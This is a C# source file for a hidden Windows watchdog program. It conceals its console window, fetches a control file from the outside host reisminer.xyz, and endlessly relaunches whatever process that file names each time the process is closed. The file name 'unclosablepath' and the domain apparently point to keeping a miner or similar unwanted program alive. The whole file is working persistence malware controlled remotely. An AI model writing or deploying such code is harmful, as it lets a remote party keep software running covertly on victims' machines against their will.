using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Process
{
    internal class Program
    {
        private static readonly WebClient wc = new WebClient();
        private static readonly string path = wc.DownloadString("http://www.reisminer.xyz/unclosablepath.txt");
        public static string[] splitted = path.Split('\n');

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        private static void Main(string[] args)
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, 0);
            while (true) CheckForProcess();
        }

        public static event EventHandler ProcessDied;

        public static void CheckForProcess()
        {
            ProcessDied = Process_Died;
            AttachProcessDiedEvent(splitted[1], ProcessDied);
        }

        public static void AttachProcessDiedEvent(string processName, EventHandler e)
        {
            System.Diagnostics.Process isSelectedProcess = null;
            foreach (var clsProcess in System.Diagnostics.Process.GetProcesses())
                if (clsProcess.ProcessName.Contains(processName))
                {
                    isSelectedProcess = clsProcess;
                    break;
                }

            if (isSelectedProcess != null) isSelectedProcess.WaitForExit();
            if (e != null) e.Invoke(processName, new EventArgs());
        }

        public static void Process_Died(object sender, EventArgs e)
        {
            startnp();
        }

        private static void startnp()
        {
            System.Diagnostics.Process.Start(splitted[0]);
        }
    }
}